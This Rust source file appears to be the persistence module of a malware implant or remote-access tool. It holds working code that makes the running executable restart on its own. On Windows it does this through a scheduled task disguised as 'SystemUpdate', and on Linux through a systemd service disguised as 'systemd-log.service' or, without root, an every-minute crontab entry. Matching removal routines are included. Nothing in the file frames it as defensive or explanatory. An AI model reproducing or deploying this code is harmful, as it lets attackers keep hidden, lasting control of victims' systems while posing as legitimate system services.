use std::process::Command;

pub fn install_persistence() -> String {
    #[cfg(windows)]
    {
        install_windows_persistence()
    }
    #[cfg(unix)]
    {
        install_linux_persistence()
    }
}

pub fn uninstall_persistence() -> String {
    #[cfg(windows)]
    {
        uninstall_windows_persistence()
    }
    #[cfg(unix)]
    {
        uninstall_linux_persistence()
    }
}

#[cfg(windows)]
fn install_windows_persistence() -> String {
    let exe = std::env::current_exe().unwrap();
    let username = whoami::username();

    let quoted_tr = format!("\"{}\"", exe.to_str().unwrap());
    let result = Command::new("schtasks")
        .args(&[
            "/create",
            "/sc",
            "minute",
            "/mo",
            "5",
            "/tn",
            "SystemUpdate",
            "/tr",
            &quoted_tr,
            "/ru",
            &username,
            "/f",
        ])
        .output();

    match result {
        Ok(_) => "Persistence installed".to_string(),
        Err(e) => format!("Error: {}", e),
    }
}

#[cfg(windows)]
fn uninstall_windows_persistence() -> String {
    let result = Command::new("schtasks")
        .args(&["/delete", "/tn", "SystemUpdate", "/f"])
        .output();

    match result {
        Ok(_) => "Persistence removed".to_string(),
        Err(e) => format!("Error: {}", e),
    }
}

#[cfg(unix)]
fn install_linux_persistence() -> String {
    let is_root = unsafe { libc::geteuid() == 0 };

    if is_root {
        // 尝试 systemd (优先)
        if let Ok(result) = install_systemd_service() {
            return result;
        }
        // 降级到 crontab
        install_crontab()
    } else {
        // 非 root 只能用 crontab
        install_crontab()
    }
}

#[cfg(unix)]
fn uninstall_linux_persistence() -> String {
    let is_root = unsafe { libc::geteuid() == 0 };

    if is_root {
        let _ = uninstall_systemd_service();
    }
    uninstall_crontab()
}

#[cfg(unix)]
fn install_systemd_service() -> Result<String, String> {
    let exe = std::env::current_exe().map_err(|e| e.to_string())?;

    let service_content = format!(
        r#"[Unit]
Description=System Logging Service
After=network.target

[Service]
Type=forking
ExecStart={}
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
"#,
        exe.display()
    );

    std::fs::write("/etc/systemd/system/systemd-log.service", service_content)
        .map_err(|e| e.to_string())?;

    Command::new("systemctl")
        .args(&["daemon-reload"])
        .output()
        .ok();

    Command::new("systemctl")
        .args(&["enable", "systemd-log.service"])
        .output()
        .ok();

    Command::new("systemctl")
        .args(&["start", "systemd-log.service"])
        .output()
        .ok();

    Ok("Systemd service installed".to_string())
}

#[cfg(unix)]
fn uninstall_systemd_service() -> String {
    Command::new("systemctl")
        .args(&["stop", "systemd-log.service"])
        .output()
        .ok();

    Command::new("systemctl")
        .args(&["disable", "systemd-log.service"])
        .output()
        .ok();

    std::fs::remove_file("/etc/systemd/system/systemd-log.service").ok();

    Command::new("systemctl")
        .args(&["daemon-reload"])
        .output()
        .ok();

    "Systemd service removed".to_string()
}

#[cfg(unix)]
fn install_crontab() -> String {
    let exe = match std::env::current_exe() {
        Ok(e) => e,
        Err(_) => return "Failed to get exe path".to_string(),
    };

    let cron_entry = format!("* * * * * {}", exe.display());

    // 获取现有 crontab
    let current = Command::new("crontab")
        .args(&["-l"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .unwrap_or_default();

    // 检查是否已存在
    if current.contains(&exe.to_string_lossy().to_string()) {
        return "Crontab already exists".to_string();
    }

    // 追加新条目（保留现有内容）
    let new_crontab = if current.is_empty() {
        format!("{}\n", cron_entry)
    } else {
        format!("{}\n{}\n", current.trim_end(), cron_entry)
    };

    let result = Command::new("sh")
        .args(&[
            "-c",
            &format!("echo '{}' | crontab -", new_crontab.replace("'", "'\\''")),
        ])
        .output();

    match result {
        Ok(_) => "Crontab installed".to_string(),
        Err(e) => format!("Crontab error: {}", e),
    }
}

#[cfg(unix)]
fn uninstall_crontab() -> String {
    let exe = match std::env::current_exe() {
        Ok(e) => e,
        Err(_) => return "Failed to get exe path".to_string(),
    };

    let current = Command::new("crontab")
        .args(&["-l"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .unwrap_or_default();

    let exe_str = exe.to_string_lossy().to_string();
    let new_crontab: String = current
        .lines()
        .filter(|line| !line.contains(&exe_str))
        .collect::<Vec<_>>()
        .join("\n");

    if new_crontab.is_empty() {
        Command::new("crontab").args(&["-r"]).output().ok();
    } else {
        Command::new("sh")
            .args(&["-c", &format!("echo '{}' | crontab -", new_crontab)])
            .output()
            .ok();
    }

    "Crontab removed".to_string()
}
